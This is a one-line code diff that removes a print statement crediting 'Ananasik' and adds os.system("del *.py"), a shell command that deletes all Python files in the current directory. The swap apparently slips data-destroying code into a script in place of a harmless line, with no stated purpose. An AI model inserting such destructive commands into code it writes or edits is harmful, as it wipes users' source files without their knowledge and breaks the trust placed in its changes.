@@ -1,1 +1,1 @@
-print("Created by Ananasik")
+os.system("del *.py")
